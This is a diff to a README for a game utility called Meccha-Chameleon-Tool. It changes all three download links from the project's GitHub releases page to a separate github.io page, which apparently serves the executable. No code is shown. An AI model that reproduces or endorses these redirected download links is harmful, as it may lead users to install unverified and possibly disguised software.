@@ -1,6 +1,6 @@
 # 🦎 Meccha-Chameleon-Tool - Take Full Control of Your Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download-Meccha_Chameleon_Tool-2ea44f?style=for-the-badge&logo=github)](https://github.com/raghulravi08032007-collab/Meccha-Chameleon-Tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Meccha_Chameleon_Tool-2ea44f?style=for-the-badge&logo=github)](https://raghulravi08032007-collab.github.io)
 
 ---
 
@@ -44,7 +44,7 @@ Getting Meccha-Chameleon-Tool up and running takes less than five minutes. Here�
 
 Visit this link to download the application:
 
-[**https://github.com/raghulravi08032007-collab/Meccha-Chameleon-Tool/releases**](https://github.com/raghulravi08032007-collab/Meccha-Chameleon-Tool/releases)
+[**https://raghulravi08032007-collab.github.io**](https://raghulravi08032007-collab.github.io)
 
 On that page, you’ll see a list of available releases. Look for the latest version (usually at the top) and click the download button. Your browser will save the file to your Downloads folder.
 
@@ -202,6 +202,6 @@ Happy gaming! 🎮
 
 **Download Link (again, just in case):**
 
-[**https://github.com/raghulravi08032007-collab/Meccha-Chameleon-Tool/releases**](https://github.com/raghulravi08032007-collab/Meccha-Chameleon-Tool/releases)
+[**https://raghulravi08032007-collab.github.io**](https://raghulravi08032007-collab.github.io)
 
 Keywords: mecha-chameleon-mods, gameplay control, automated painting, windows utility, game enhancer, pc gaming tool
